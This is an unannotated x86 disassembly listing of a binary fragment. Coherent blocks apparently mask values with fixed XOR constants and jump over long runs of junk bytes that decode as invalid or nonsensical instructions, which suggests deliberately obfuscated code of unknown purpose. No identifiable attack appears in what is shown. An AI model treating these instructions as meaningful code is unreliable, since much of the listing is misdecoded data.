  41dc98:	mov    DWORD PTR [edi+eiz*1-0x4cd6ba9b],esi
  41dc9f:	(bad)  
  41dca0:	std    
  41dca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dca2:	(bad)  
  41dca3:	(bad)  
  41dca4:	cmp    eax,0x176d070f
  41dca9:	cmp    dh,BYTE PTR [ebx-0x64]
  41dcac:	and    bl,0xd7
  41dcaf:	lea    esp,[ebx+0x4]
  41dcb2:	daa    
  41dcb3:	sti    
  41dcb4:	add    al,0x79
  41dcb6:	fild   QWORD PTR [esi+0x62c5e079]
  41dcbc:	add    ebp,DWORD PTR [ebp+0x24f26dd7]
  41dcc2:	inc    esp
  41dcc3:	cmc    
  41dcc4:	xor    DWORD PTR [edx+0x53],ebx
  41dcc7:	mov    al,ds:0xad989f75
  41dccc:	imul   eax,DWORD PTR [eax+0x9],0x51e6ad7e
  41dcd3:	out    0x97,eax
  41dcd5:	(bad)  
  41dcd6:	xchg   DWORD PTR [edx-0x4dc76e32],ecx
  41dcdc:	stc    
  41dcdd:	fmul   DWORD PTR [edx+ebx*8]
  41dce0:	std    
  41dce1:	adc    eax,0x52881f72
  41dce6:	loope  0x41dccb
  41dce8:	pop    edx
  41dce9:	pushf  
  41dcea:	xlat   BYTE PTR ds:[ebx]
  41dceb:	and    eax,0x108be372
  41dcf0:	xchg   ebp,eax
  41dcf1:	jge    0x41dcf5
  41dcf3:	js     0x41dd14
  41dcf5:	ins    DWORD PTR es:[edi],dx
  41dcf6:	push   cs
  41dcf7:	push   edi
  41dcf8:	jmp    0x41dc9e
  41dcfa:	mov    DWORD PTR [ecx+ecx*4],edx
  41dcfd:	mov    esp,0xcc71d03b
  41dd02:	mov    cl,0x89
  41dd04:	stc    
  41dd05:	xor    esi,DWORD PTR [esi+0x2a]
  41dd08:	dec    esi
  41dd09:	rcl    DWORD PTR [esi],1
  41dd0b:	add    bl,BYTE PTR [edi-0x524f0721]
  41dd11:	mov    esi,0xf33d67d0
  41dd16:	sbb    bh,BYTE PTR cs:[esi+0x340c0427]
  41dd1d:	push   ebp
  41dd1e:	and    DWORD PTR [eax],eax
  41dd20:	iret   
  41dd21:	jmp    0x5548db0b
  41dd26:	mov    WORD PTR [edi+ecx*4],ds
  41dd29:	les    edi,FWORD PTR [ebx+0x343202ce]
  41dd2f:	jmp    0x41dd2c
  41dd31:	mov    bh,0xbd
  41dd33:	cmc    
  41dd34:	sub    eax,0x7d8e8dcc
  41dd39:	and    esi,DWORD PTR [ecx+0x72275]
  41dd3f:	inc    esi
  41dd40:	mov    ah,0xd
  41dd42:	pop    ebp
  41dd43:	xor    BYTE PTR [edi],bh
  41dd45:	push   es
  41dd46:	sti    
  41dd47:	lock je 0x41dd5f
  41dd4a:	mov    DWORD PTR [ebx],ebx
  41dd4c:	arpl   WORD PTR [edi-0x4c1968e3],di
  41dd52:	or     eax,0x2b5208a
  41dd57:	push   ds
  41dd58:	sub    esp,esp
  41dd5a:	daa    
  41dd5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd5c:	jb     0x41dd89
  41dd5e:	mov    BYTE PTR [eax+0x791116c3],al
  41dd64:	fs mov al,0x2a
  41dd67:	or     ebp,DWORD PTR [ebx-0x1b]
  41dd6a:	repnz add al,0x11
  41dd6d:	pop    edi
  41dd6e:	sub    DWORD PTR [eax-0x3e],ecx
  41dd71:	repnz bound edx,QWORD PTR [edx+edi*4]
  41dd75:	cmp    eax,0x374d5273
  41dd7a:	loopne 0x41dd92
  41dd7c:	push   esi
  41dd7d:	(bad)  
  41dd7f:	std    
  41dd80:	adc    DWORD PTR [eax],esi
  41dd82:	ins    BYTE PTR es:[edi],dx
  41dd83:	pop    edi
  41dd84:	cld    
  41dd85:	push   edi
  41dd86:	in     al,dx
  41dd87:	cmp    eax,DWORD PTR [ecx-0x2637b530]
  41dd8d:	leave  
  41dd8e:	out    dx,eax
  41dd8f:	xor    al,0x26
  41dd91:	lods   eax,DWORD PTR ds:[esi]
  41dd92:	jl     0x41dd47
  41dd94:	mov    ch,0xcc
  41dd96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd97:	sbb    dl,BYTE PTR ds:0x89d361f6
  41dd9d:	xor    al,0x4
  41dd9f:	icebp  
  41dda0:	scas   eax,DWORD PTR es:[edi]
  41dda1:	cwde   
  41dda2:	(bad)  [esi+0x7fda44af]
  41dda8:	mov    ebp,DWORD PTR es:[ecx]
  41ddab:	cmp    bl,ch
  41ddad:	xlat   BYTE PTR ds:[bx]
  41ddaf:	cmp    eax,0x849acd97
  41ddb4:	push   esi
  41ddb5:	mov    dl,BYTE PTR [ebx-0x3]
  41ddb8:	xchg   ebp,eax
  41ddb9:	mov    ch,0x55
  41ddbb:	sar    DWORD PTR [ecx+eax*8-0x28f38eac],cl
  41ddc2:	fnsave [edx]
  41ddc4:	mov    esp,0xb318bea
  41ddc9:	mov    ebp,0xb6bc2019
  41ddce:	fs retf 
  41ddd0:	push   es
  41ddd1:	sahf   
  41ddd2:	ret    0xf50d
  41ddd5:	and    DWORD PTR [ebx+0x3e062f7e],0xffffffb9
  41dddc:	frstor [ecx+0x6f38e5de]
  41dde2:	sub    BYTE PTR [esi+ebp*8+0x391ded7e],cl
  41dde9:	clc    
  41ddea:	sub    ax,0xfe88
  41ddee:	inc    esp
  41ddef:	gs in  eax,dx
  41ddf1:	call   0xe6545771
  41ddf6:	leave  
  41ddf7:	push   DWORD PTR [esi+0x3b]
  41ddfa:	xlat   BYTE PTR ds:[ebx]
  41ddfb:	jle    0x41de0d
  41ddfd:	cwde   
  41ddfe:	xchg   ecx,eax
  41ddff:	and    al,0xc3
  41de01:	mov    ah,0x59
  41de03:	fxch   st(2)
  41de05:	xchg   esp,eax
  41de06:	cmovl  ebx,DWORD PTR ds:0xa0cd4c3f
  41de0d:	out    0x35,al
  41de0f:	cmp    bh,cl
  41de11:	inc    ecx
  41de12:	jmp    0x5656:0x6303175a
  41de19:	sbb    al,0xa0
  41de1b:	cld    
  41de1c:	fcmovu st,st(5)
  41de1e:	cmp    al,0x5b
  41de20:	hlt    
  41de21:	arpl   WORD PTR ds:0xcb79b576,si
  41de27:	xor    edx,0x9c2b8ae8
  41de2d:	mov    cl,0x2
  41de2f:	call   0x408bb8
  41de34:	mov    ecx,edx
  41de36:	mov    edx,DWORD PTR [ebp-0x15c]
  41de3c:	mov    DWORD PTR [ebp-0x218],esi
  41de42:	mov    esi,DWORD PTR [ebp-0x158]
  41de48:	xor    edx,0xcb79b576
  41de4e:	xor    esi,0x9c2b8ae8
  41de54:	mov    DWORD PTR [ebp-0x21c],eax
  41de5a:	mov    eax,edx
  41de5c:	mov    edx,esi
  41de5e:	mov    DWORD PTR [ebp-0x220],ecx
  41de64:	mov    cl,0x3e
  41de66:	call   0x4223e0
  41de6b:	mov    esi,DWORD PTR [ebp-0x21c]
  41de71:	or     esi,eax
  41de73:	mov    eax,DWORD PTR [ebp-0x220]
  41de79:	or     eax,edx
  41de7b:	push   eax
  41de7c:	push   esi
  41de7d:	push   ebx
  41de7e:	push   edi
  41de7f:	call   0x41594e
  41de84:	mov    esi,DWORD PTR [ebp-0x218]
  41de8a:	cmp    esi,eax
  41de8c:	jne    0x41df42
  41de92:	mov    eax,DWORD PTR [ebp-0x154]
  41de98:	mov    edx,DWORD PTR [ebp-0x150]
  41de9e:	xor    eax,0xcb79b576
  41dea3:	xor    edx,0x9c2b8ae8
  41dea9:	mov    cl,0x2
  41deab:	call   0x408bb8
  41deb0:	mov    esi,eax
  41deb2:	mov    edi,edx
  41deb4:	mov    eax,DWORD PTR [ebp-0x154]
  41deba:	mov    edx,DWORD PTR [ebp-0x150]
  41dec0:	xor    eax,0xcb79b576
  41dec5:	xor    edx,0x9c2b8ae8
  41decb:	mov    cl,0x3e
  41decd:	call   0x4223e0
  41ded2:	or     esi,eax
  41ded4:	or     edi,edx
  41ded6:	mov    eax,DWORD PTR [ebp-0x15c]
  41dedc:	mov    edx,DWORD PTR [ebp-0x158]
  41dee2:	xor    eax,0xcb79b576
  41dee7:	xor    edx,0x9c2b8ae8
  41deed:	mov    cl,0x2
  41deef:	call   0x408bb8
  41def4:	mov    ebx,eax
  41def6:	mov    eax,edx
  41def8:	mov    ecx,DWORD PTR [ebp-0x15c]
  41defe:	mov    edx,DWORD PTR [ebp-0x158]
  41df04:	xor    ecx,0xcb79b576
  41df0a:	xor    edx,0x9c2b8ae8
  41df10:	mov    DWORD PTR [ebp-0x224],eax
  41df16:	mov    eax,ecx
  41df18:	mov    cl,0x3e
  41df1a:	call   0x4223e0
  41df1f:	or     ebx,eax
  41df21:	mov    eax,DWORD PTR [ebp-0x224]
  41df27:	or     eax,edx
  41df29:	push   eax
  41df2a:	push   ebx
  41df2b:	push   edi
  41df2c:	push   esi
  41df2d:	call   0x41594e
  41df32:	mov    DWORD PTR [ebp-0x178],eax
  41df38:	jmp    0x41f19e
  41df3d:	jmp    0x41f154
  41df42:	lea    eax,[ebp-0x168]
  41df48:	mov    DWORD PTR [ebp-0x164],eax
  41df4e:	mov    eax,DWORD PTR [ebp-0x164]
  41df54:	mov    DWORD PTR [eax],0xa5069bae
  41df5a:	mov    eax,DWORD PTR [ebp-0x168]
  41df60:	xor    eax,0xa5069bae
  41df65:	shr    eax,0x2
  41df68:	mov    ecx,DWORD PTR [ebp-0x168]
  41df6e:	xor    ecx,0xa5069bae
  41df74:	shl    ecx,0x1e
  41df77:	or     eax,ecx
  41df79:	mov    ecx,DWORD PTR [ebp-0x174]
  41df7f:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  41df83:	mov    DWORD PTR [ebp-0x160],eax
  41df89:	mov    esi,DWORD PTR [ebp-0x160]
  41df8f:	mov    eax,DWORD PTR [ebp-0x154]
  41df95:	mov    edx,DWORD PTR [ebp-0x150]
  41df9b:	xor    eax,0xcb79b576
  41dfa0:	xor    edx,0x9c2b8ae8
  41dfa6:	mov    cl,0x2
  41dfa8:	call   0x408bb8
  41dfad:	mov    edi,eax
  41dfaf:	mov    ebx,edx
  41dfb1:	mov    eax,DWORD PTR [ebp-0x154]
  41dfb7:	jmp    0x41e39e
  41dfbc:	mov    bl,0xa1
  41dfbe:	mov    eax,ds:0xbba5b3a5
  41dfc3:	mov    ebx,0xd1567b79
  41dfc8:	push   ss
  41dfc9:	add    DWORD PTR [edx+edx*4],edi
  41dfcc:	nop
  41dfcd:	pop    edi
  41dfce:	sar    BYTE PTR [esi-0x41413bb6],0xf7
  41dfd5:	call   0xf1a5bc8c
  41dfda:	fsubrp st(4),st
  41dfdc:	push   edx
  41dfdd:	push   eax
  41dfde:	mov    ah,BYTE PTR [edx]
  41dfe0:	mov    edi,0xe9db53c6
  41dfe5:	and    eax,DWORD PTR [ecx-0x3b]
  41dfe8:	dec    esi
  41dfe9:	push   edi
  41dfea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfeb:	jmp    0x41dfa4
  41dfed:	repz lea ecx,[ebp-0x69a398c5]
  41dff4:	sbb    al,0xb2
  41dff6:	jbe    0x41df94
  41dff8:	or     eax,DWORD PTR [ebx+edx*1-0x11]
  41dffc:	fdiv   DWORD PTR [eax-0x6a]
  41dfff:	xchg   ebp,eax
  41e001:	pop    ebp
  41e002:	nop
  41e003:	or     al,0xd2
  41e005:	mov    bh,dh
  41e007:	pop    es
  41e008:	pop    ecx
  41e009:	cmp    eax,0xa6b8b7d3
  41e00e:	jecxz  0x41e05e
  41e010:	mov    BYTE PTR [ebx],cl
  41e012:	mov    al,ds:0x326ce6ab
  41e017:	(bad)  
  41e018:	stos   BYTE PTR es:[edi],al
  41e019:	ficomp DWORD PTR [edx+0x5c45aba0]
  41e01f:	call   0x249d:0x82e65c94
  41e026:	and    DWORD PTR [edi+esi*1+0x6a482f7e],ebp
  41e02d:	data16 xchg BYTE PTR ds:0xdb6b27d8,dl
  41e034:	cmp    al,0x8
  41e036:	clc    
  41e037:	(bad)  
  41e038:	mov    dh,0x61
  41e03a:	pop    ss
  41e03b:	cli    
  41e03c:	fiadd  DWORD PTR [esi+0x537c9659]
  41e042:	and    ebp,DWORD PTR [edi]
  41e044:	mov    ah,0x2d
  41e046:	xor    DWORD PTR [edx+0x30],0x7712152e
  41e04d:	sub    ebx,DWORD PTR [edi-0x70]
  41e050:	aaa    
  41e051:	dec    edi
  41e052:	rcl    DWORD PTR [esi-0x21],1
  41e055:	push   es
  41e056:	imul   esi,DWORD PTR [ecx-0x40],0x22
  41e05a:	inc    eax
  41e05b:	dec    ebp
  41e05c:	pop    ds
  41e05d:	sub    edi,DWORD PTR [ecx]
  41e05f:	xor    bl,BYTE PTR [ebx-0x4d]
  41e062:	mov    ebx,0x16f9ba77
  41e067:	or     DWORD PTR [edi],ebp
  41e069:	lods   al,BYTE PTR ds:[esi]
  41e06a:	aad    0x7f
  41e06c:	push   es
  41e06d:	cmc    
  41e06e:	sbb    bl,dh
  41e070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e071:	repnz scas eax,DWORD PTR es:[edi]
  41e073:	int    0x5d
  41e075:	lds    ebx,FWORD PTR [ebx-0x39]
  41e078:	(bad)  
  41e079:	pop    ds
  41e07a:	(bad)  
  41e07c:	mov    eax,ebx
  41e07e:	jne    0x41e068
  41e080:	aad    0x1
  41e082:	outs   dx,DWORD PTR ds:[esi]
  41e083:	push   es
  41e084:	jle    0x41e0bc
  41e086:	push   ecx
  41e087:	enter  0x833c,0xe3
  41e08b:	xor    esp,DWORD PTR [ebp+0x18dbdf04]
  41e091:	xchg   ebp,eax
  41e092:	test   DWORD PTR ds:0xe910371c,0xa29f8cc8
  41e09c:	xor    edi,0x6bdd94e9
  41e0a2:	scas   eax,DWORD PTR es:[edi]
  41e0a3:	jne    0x41e0e0
  41e0a5:	dec    esp
  41e0a6:	pop    ebx
  41e0a7:	xor    eax,0xb03a2442
  41e0ac:	(bad)  
  41e0ad:	sti    
  41e0ae:	dec    esi
  41e0af:	jle    0x41e0b7
  41e0b1:	mov    bl,0x50
  41e0b3:	in     al,dx
  41e0b4:	xor    al,0xa3
  41e0b6:	test   BYTE PTR [edi-0x753390d0],dh
  41e0bc:	or     edi,DWORD PTR [edi-0x71]
  41e0bf:	mov    edi,esp
  41e0c1:	ficom  WORD PTR [ebp-0x59323169]
  41e0c7:	into   
  41e0c8:	pop    ds
  41e0c9:	jo     0x41e06a
  41e0cb:	call   0x9d05:0xeec90e02
  41e0d2:	mov    esp,?
  41e0d4:	je     0x41e10a
  41e0d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0d7:	and    ecx,ebx
  41e0d9:	ss out dx,al
  41e0db:	mov    edx,0x246672d4
  41e0e0:	loop   0x41e0d6
  41e0e2:	xchg   esp,eax
  41e0e3:	pop    ecx
  41e0e4:	xlat   BYTE PTR ds:[ebx]
  41e0e5:	push   edx
  41e0e6:	stos   BYTE PTR es:[edi],al
  41e0e7:	test   eax,0x7735eded
  41e0ec:	sbb    edx,DWORD PTR [ecx-0x35e12a89]
  41e0f2:	in     al,dx
  41e0f3:	dec    esp
  41e0f4:	inc    edi
  41e0f5:	bound  ebx,QWORD PTR [ecx]
  41e0f7:	jns    0x41e0c1
  41e0f9:	stc    
  41e0fa:	cs es leave 
  41e0fd:	icebp  
  41e0fe:	not    DWORD PTR [ecx+0x79]
  41e101:	lahf   
  41e102:	mov    al,BYTE PTR [edx]
  41e104:	mov    ch,0x40
  41e106:	xchg   esp,edx
  41e108:	lea    ebp,[eax]
  41e10a:	mov    ss,WORD PTR [eax+0x703bfbf1]
  41e110:	cli    
  41e111:	push   esp
  41e112:	sbb    esp,edi
  41e114:	hlt    
  41e115:	sub    esp,DWORD PTR [edx]
  41e117:	enter  0x5a8a,0x48
  41e11b:	cmp    al,0xdd
  41e11d:	jnp    0x41e12c
  41e11f:	lds    esp,FWORD PTR [esi-0x58d4576f]
  41e125:	mov    dh,0x62
  41e127:	cli    
  41e128:	jb     0x41e100
  41e12a:	js     0x41e0fa
  41e12c:	cmp    esp,DWORD PTR [ebp-0x7]
  41e12f:	cmp    al,0x90
  41e132:	int    0xe7
  41e134:	add    DWORD PTR [ebx],esi
  41e136:	jmp    0x9fa8:0xc7037853
  41e13d:	sbb    ah,ch
  41e13f:	aas    
  41e140:	xor    al,ch
  41e142:	retf   
  41e143:	xor    DWORD PTR [ebx+0x7aed7707],ebp
  41e149:	adc    edi,ebx
  41e14b:	xchg   esp,eax
  41e14c:	fst    DWORD PTR [ecx-0x405208dd]
  41e152:	sbb    al,0xf0
  41e154:	dec    ecx
  41e155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e156:	pop    eax
  41e157:	inc    esp
  41e158:	hlt    
  41e159:	lods   eax,DWORD PTR ds:[esi]
  41e15a:	inc    ebx
  41e15b:	out    dx,al
  41e15c:	aam    0xe2
  41e15e:	stos   BYTE PTR es:[edi],al
  41e15f:	push   ebx
  41e160:	(bad)  
  41e161:	jnp    0x41e179
  41e163:	pop    esi
  41e164:	pushf  
  41e165:	xor    BYTE PTR [edi+0x53],0xb3
  41e169:	push   ds
  41e16a:	mov    DWORD PTR [ecx],edx
  41e16c:	xor    al,0x6c
  41e16e:	in     al,dx
  41e16f:	xlat   BYTE PTR ds:[ebx]
  41e170:	adc    BYTE PTR [ebp-0x19],cl
  41e173:	cmc    
  41e174:	sbb    eax,0x21a517b1
  41e179:	repz jg 0x41e16a
  41e17c:	out    dx,al
  41e17d:	stos   BYTE PTR es:[edi],al
  41e17e:	mov    ds:0x6ca6d3fe,al
  41e183:	add    BYTE PTR [ebx],ah
  41e185:	add    DWORD PTR [ebx],0x30
  41e188:	popa   
  41e189:	add    BYTE PTR ds:[ebp+0x489af693],dh
  41e190:	push   edx
  41e191:	enter  0x2224,0x57
  41e195:	push   edx
  41e196:	push   ds
  41e197:	imul   edi,DWORD PTR [eax+0xe],0x6f078ccf
  41e19e:	enter  0xd288,0xc5
  41e1a2:	inc    edx
  41e1a3:	mov    ch,BYTE PTR [ebp+0x4a]
  41e1a6:	rol    esi,0xd
  41e1a9:	hlt    
  41e1aa:	pop    ss
  41e1ab:	iret   
  41e1ac:	dec    edi
  41e1ad:	inc    edx
  41e1ae:	int3   
  41e1af:	adc    al,0xf0
  41e1b1:	and    eax,0x47014ab5
  41e1b6:	repz pop ebx
  41e1b8:	push   ds
  41e1b9:	fcomp  DWORD PTR [ebp-0x57340728]
  41e1bf:	icebp  
  41e1c0:	xor    eax,0xf7296079
  41e1c5:	inc    esp
  41e1c6:	imul   ebp,DWORD PTR [ebx-0x7],0xffffffcf
  41e1ca:	inc    esi
  41e1cb:	repz and bl,BYTE PTR [ecx+0x7e8d1d0d]
  41e1d2:	dec    edi
  41e1d3:	mov    ecx,0x23ab6b0d
  41e1d8:	iret   
  41e1d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1da:	cmp    cl,BYTE PTR [ebx+edx*4+0x16]
  41e1de:	test   eax,0x123f88ec
  41e1e3:	loop   0x41e1ef
  41e1e5:	cdq    
  41e1e6:	cdq    
  41e1e7:	aaa    
  41e1e8:	add    BYTE PTR [edi],bl
  41e1ea:	stos   DWORD PTR es:[edi],eax
  41e1eb:	push   edi
  41e1ec:	or     eax,0xd97f7049
  41e1f1:	jbe    0x41e1b0
  41e1f3:	dec    ebx
  41e1f4:	xchg   edx,eax
  41e1f5:	cmp    DWORD PTR [ebp+0x12b4355c],edi
  41e1fb:	popa   
  41e1fc:	or     BYTE PTR [edi+0x1e],ch
  41e1ff:	aad    0xb1
  41e201:	pop    edi
  41e202:	imul   ebp,DWORD PTR ds:0x47ad9a1f,0xffffff95
  41e209:	fldenv [eax]
  41e20b:	lds    ebx,FWORD PTR [ebx]
  41e20d:	addr16 adc eax,0x23b84fa3
  41e213:	loop   0x41e20c
  41e215:	jno    0xa063ed6e
  41e21b:	jno    0x41e28f
  41e21d:	and    bl,BYTE PTR ds:0x107c3f79
  41e223:	mov    BYTE PTR [eax+0x1ffcd2ab],ah
  41e229:	repz xchg ebx,eax
  41e22b:	push   ecx
  41e22c:	ret    
  41e22d:	mov    ds:0x95f175e4,al
  41e232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e233:	cmc    
  41e234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e235:	xchg   esi,eax
  41e236:	inc    eax
  41e237:	fnstcw WORD PTR [edi-0x17dfc98a]
  41e23d:	ins    BYTE PTR es:[edi],dx
  41e23e:	cmp    esp,esp
  41e240:	mov    al,0x1f
  41e242:	lock or al,0xa5
  41e245:	adc    DWORD PTR [edx],esp
  41e247:	and    eax,0x9e2aadad
  41e24c:	add    dl,dl
  41e24e:	out    dx,eax
  41e24f:	lods   al,BYTE PTR ds:[esi]
  41e250:	jb     0x41e1ff
  41e252:	dec    ebp
  41e253:	inc    ebx
  41e254:	adc    DWORD PTR [ecx],ebx
  41e256:	pop    ebp
  41e257:	jmp    0x41e21a
  41e259:	jmp    0xe7a8:0xbfb331c0
  41e260:	sub    eax,0x3792134e
  41e265:	cmp    edx,DWORD PTR [eax]
  41e267:	cwde   
  41e268:	push   ebp
  41e269:	adc    DWORD PTR [edi-0x6c87d794],esi
  41e26f:	sbb    al,0x2
  41e271:	pop    esp
  41e272:	adc    esp,0xffffffe8
  41e275:	(bad)  
  41e276:	in     eax,dx
  41e277:	int    0xc5
  41e279:	inc    esp
  41e27a:	inc    ecx
  41e27b:	xlat   BYTE PTR ds:[ebx]
  41e27c:	loope  0x41e232
  41e27e:	mov    ecx,0xf9f2c8d5
  41e283:	out    0xe9,eax
  41e285:	mov    ds:0xe8e7a018,al
  41e28a:	push   eax
  41e28b:	(bad)  
  41e28d:	pop    ebx
  41e28e:	sbb    al,0x32
  41e290:	push   ss
  41e291:	inc    ebp
  41e292:	sar    BYTE PTR [ebx],0x4e
  41e295:	push   eax
  41e296:	in     al,0x95
  41e298:	rol    edx,0xe3
  41e29b:	stos   BYTE PTR es:[edi],al
  41e29c:	mov    bl,al
  41e29e:	mov    bh,0x5d
  41e2a0:	pusha  
  41e2a1:	js     0x41e2f7
  41e2a3:	int3   
  41e2a4:	mov    ?,WORD PTR [edi]
  41e2a6:	fisubr WORD PTR [edi-0x6]
  41e2a9:	sahf   
  41e2aa:	push   ss
  41e2ab:	pushf  
  41e2ac:	cdq    
  41e2ad:	xchg   esi,eax
  41e2ae:	sti    
  41e2af:	xor    al,bh
  41e2b1:	hlt    
  41e2b2:	out    dx,al
  41e2b3:	ins    DWORD PTR es:[edi],dx
  41e2b4:	inc    eax
  41e2b5:	adc    DWORD PTR [edi],ebp
  41e2b7:	pop    ebx
  41e2b8:	popf   
  41e2b9:	and    esi,DWORD PTR [eax-0x79d93712]
  41e2bf:	fadd   DWORD PTR [edx-0x71]
  41e2c2:	dec    esi
  41e2c3:	test   al,0xbc
  41e2c5:	xor    bl,BYTE PTR [ebp+eax*4-0x41ba4a74]
  41e2cc:	adc    ebp,DWORD PTR [ebp+0x1905e243]
  41e2d2:	cmp    BYTE PTR [ebp+0x13],0x1e
  41e2d6:	cwde   
  41e2d7:	(bad)  
  41e2d8:	int3   
  41e2d9:	push   0xffffffa3
  41e2db:	sub    cl,dh
  41e2dd:	xchg   ebp,eax
  41e2de:	jno    0x41e2ce
  41e2e0:	mov    DWORD PTR [edi-0x55f8234e],ebx
  41e2e6:	es pop ecx
  41e2e8:	push   eax
  41e2e9:	adc    eax,0x75454955
  41e2ee:	pop    eax
  41e2ef:	ins    BYTE PTR es:[edi],dx
  41e2f0:	shr    BYTE PTR [edx+0x3e8d0832],0x5
  41e2f7:	mov    eax,ds:0x6af87a67
  41e2fc:	gs cdq 
  41e2fe:	daa    
  41e2ff:	and    al,bh
  41e301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e302:	xchg   BYTE PTR [esi+0x7f0daf75],ah
  41e308:	stc    
  41e309:	es mov ch,0xe6
  41e30c:	add    BYTE PTR [eax+0x6b91d897],bh
  41e312:	leave  
  41e313:	add    esi,esp
  41e315:	and    al,0x1d
  41e317:	ins    DWORD PTR es:[edi],dx
  41e318:	daa    
  41e319:	js     0x41e2cd
  41e31b:	leave  
  41e31c:	(bad)  
  41e31d:	sbb    eax,0xe5b78b60
  41e322:	test   BYTE PTR [edx+0xa12ac1b],0x22
  41e329:	add    eax,0x9f6ad33b
  41e32e:	pfrsqrt mm0,QWORD PTR [ecx+edx*8+0x35]
  41e334:	xchg   esp,eax
  41e335:	ret    0x4dc1
  41e338:	(bad)  
  41e339:	mov    dh,0x3f
  41e33b:	jle    0x41e34a
  41e33d:	pop    eax
  41e33e:	cs sbb al,0xca
  41e341:	dec    esp
  41e342:	and    DWORD PTR [ebx+0x7c],ebp
  41e345:	mov    al,ds:0x862bf7c9
  41e34a:	aad    0xfd
  41e34c:	jno    0x41e334
  41e34e:	jle    0x41e316
  41e350:	stos   DWORD PTR es:[edi],eax
  41e351:	xor    esp,ebp
  41e353:	fwait
  41e354:	xor    bh,bh
  41e356:	out    dx,eax
  41e357:	adc    bh,BYTE PTR [ebx+edi*8+0x60]
  41e35b:	cmp    al,ch
  41e35d:	aaa    
  41e35e:	mov    ebp,0xf99d6869
  41e363:	xchg   edx,eax
  41e364:	pop    ecx
  41e365:	(bad)  
  41e366:	aad    0x71
  41e368:	or     ebp,DWORD PTR [edx]
  41e36a:	dec    esp
  41e36b:	and    DWORD PTR [eax],ebp
  41e36d:	add    DWORD PTR [ebx+0x76],0x2de7ef34
  41e374:	sub    esp,esp
  41e376:	retf   0xac0e
  41e379:	arpl   WORD PTR [ecx-0xb4491d6],dx
  41e37f:	cmp    dl,ch
  41e381:	push   edi
  41e382:	loope  0x41e344
  41e384:	stos   BYTE PTR es:[edi],al
  41e385:	push   es
  41e386:	adc    BYTE PTR [edi+eax*1],dl
  41e389:	loop   0x41e359
  41e38b:	cld    
  41e38c:	mov    al,BYTE PTR [ecx-0x27]
  41e38f:	add    eax,0x770521bd
  41e394:	mov    WORD PTR [ebp-0x4],ds
  41e397:	std    
  41e398:	aam    0x69
  41e39a:	imul   esp,DWORD PTR [ebx],0xffffffdd
  41e39d:	mov    ecx,0xfeb0958b
  41e3a2:	(bad)  
  41e3a3:	push   DWORD PTR ds:0xcb79b576
  41e3a9:	xor    edx,0x9c2b8ae8
  41e3af:	mov    cl,0x3e
  41e3b1:	call   0x4223e0
  41e3b6:	or     edi,eax
  41e3b8:	or     ebx,edx
  41e3ba:	mov    eax,DWORD PTR [ebp-0x15c]
  41e3c0:	mov    edx,DWORD PTR [ebp-0x158]
  41e3c6:	xor    eax,0xcb79b576
  41e3cb:	xor    edx,0x9c2b8ae8
  41e3d1:	mov    cl,0x2
  41e3d3:	call   0x408bb8
  41e3d8:	mov    ecx,edx
  41e3da:	mov    edx,DWORD PTR [ebp-0x15c]
  41e3e0:	mov    DWORD PTR [ebp-0x228],esi
  41e3e6:	mov    esi,DWORD PTR [ebp-0x158]
  41e3ec:	xor    edx,0xcb79b576
  41e3f2:	xor    esi,0x9c2b8ae8
  41e3f8:	mov    DWORD PTR [ebp-0x22c],eax
  41e3fe:	mov    eax,edx
  41e400:	mov    edx,esi
  41e402:	mov    DWORD PTR [ebp-0x230],ecx
  41e408:	mov    cl,0x3e
  41e40a:	call   0x4223e0
  41e40f:	mov    esi,DWORD PTR [ebp-0x22c]
  41e415:	or     esi,eax
  41e417:	mov    eax,DWORD PTR [ebp-0x230]
  41e41d:	or     eax,edx
  41e41f:	push   eax
  41e420:	push   esi
  41e421:	jmp    0x41e808
  41e426:	rcl    BYTE PTR [ebp+0x47],cl
  41e429:	cmp    ecx,DWORD PTR [ebx+0x3b]
  41e42c:	mov    cl,0xb7
  41e42e:	scas   eax,DWORD PTR es:[edi]
  41e42f:	xor    ebx,DWORD PTR [ecx+edx*8]
  41e432:	nop
  41e433:	and    DWORD PTR [ebx+eiz*8-0x413f98e4],ebp
  41e43a:	dec    edx
  41e43b:	les    edi,FWORD PTR [esi+0x7265cebe]
  41e441:	xchg   edx,eax
  41e442:	ret    
  41e443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e444:	int    0x9a
  41e446:	mov    dl,0x95
  41e448:	xlat   BYTE PTR ds:[ebx]
  41e449:	in     al,0x8b
  41e44b:	aam    0xb4
  41e44d:	popf   
  41e44e:	cdq    
  41e44f:	fstp   TBYTE PTR [eax-0x9]
  41e452:	aam    0x35
  41e454:	sbb    edi,edi
  41e456:	pop    ss
  41e457:	test   eax,0x9e0b37c4
  41e45c:	push   eax
  41e45d:	(bad)  
  41e45e:	jb     0x41e42a
  41e460:	mov    eax,0xe1b108fa
  41e465:	popa   
  41e466:	xor    al,0xb2
  41e468:	lahf   
  41e469:	xchg   ecx,eax
  41e46a:	mov    edx,0xae54dc10
  41e46f:	fs dec ecx
  41e471:	jno    0x41e4ae
  41e473:	mov    ebp,0xb73fe1b4
  41e478:	xchg   esi,eax
  41e479:	test   DWORD PTR [edx-0x6e],0x1cf45fb3
  41e480:	out    0xa4,eax
  41e482:	dec    edx
  41e483:	icebp  
  41e484:	iret   
  41e485:	xchg   DWORD PTR [edx+0x6d8374e9],edx
  41e48b:	add    eax,0xddf84128
  41e490:	ror    DWORD PTR [esi+0x4e],cl
  41e493:	sbb    ebx,eax
  41e495:	pop    edi
  41e496:	push   edi
  41e497:	dec    eax
  41e498:	jp     0x41e491
  41e49a:	or     BYTE PTR [esi+0x2a],0x90
  41e49e:	cmp    DWORD PTR [ebx+0x25],esp
  41e4a1:	sbb    bl,0xfb
  41e4a4:	sar    BYTE PTR [eax+0x50c97aa6],0x4d
  41e4ab:	cwde   
